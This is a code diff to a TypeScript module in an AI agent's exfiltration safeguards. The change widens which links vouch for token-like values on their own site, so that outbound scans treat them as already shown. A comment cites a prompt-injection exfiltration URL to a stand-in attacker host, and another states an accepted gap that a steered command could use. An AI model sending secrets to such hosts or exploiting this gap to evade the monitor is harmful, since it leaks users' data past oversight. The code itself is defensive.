@@ -9,12 +9,19 @@
  * attacker.com/?k=<secret>" cannot have shown the agent the user's secret, so
  * this exempts the console URL and never the injection.
  *
- * Three sources are recorded: what each browser result showed, under the site
+ * Four sources are recorded: what each browser result showed, under the site
  * of the page it ended on (the page text and its URL); what each http_request
  * or web_fetch response showed, under the site it came from (an API's ids are
- * the next request's path); and each link the user typed, under that link's
+ * the next request's path); each link the user typed, under that link's
  * site (a pasted document link shows its site the document's own id; no one
- * can type a secret they do not have). Every
+ * can type a secret they do not have); and each whole link any tool's result
+ * printed, under that link's own site (a build command prints the download
+ * link its service issued, and opening it asked the owner whether the build
+ * id was a password, 2026-11-26). A link printed by a tool vouches its ids for
+ * its own site only. The trade, accepted by the owner: a command the agent was
+ * steered into could print a link to any site with an unknown random value
+ * in it; vault values, known key formats and what a sensitive read delivered
+ * are still judged below, as for an API response. Every
  * outbound scan with a destination consults it (vouchedFor): the egress gate,
  * http_request's own check, and the threat engine's post-call scan, so the
  * three agree. Only entropy-heuristic hits consult it: vault values, known key
@@ -73,15 +80,18 @@ export function recordResponseTokens(sessionId: string, url: string, shown: stri
   if (sessionId && site) remember(stateOf(sessionId), site, shown);
 }
 
-/** Record the token-shaped strings in each link the user typed, under that
- *  link's site. */
-export function recordUserLinks(sessionId: string, text: string): void {
+/** Record the token-shaped strings in each link `text` holds, under that
+ *  link's own site: a link the user typed, or one a tool's result printed. */
+export function recordLinks(sessionId: string, text: string): void {
   if (!sessionId || !text) return;
   for (const [link] of text.matchAll(/https?:\/\/[^\s<>"'`)\]]+/g)) {
     const site = siteOf(link);
     if (site) remember(stateOf(sessionId), site, link);
   }
 }
+
+/** Each link the user typed (recordLinks). */
+export const recordUserLinks = recordLinks;
 
 function remember(state: SessionProvenance, site: string, text: string): void {
   let seen = state.bySite.get(site);
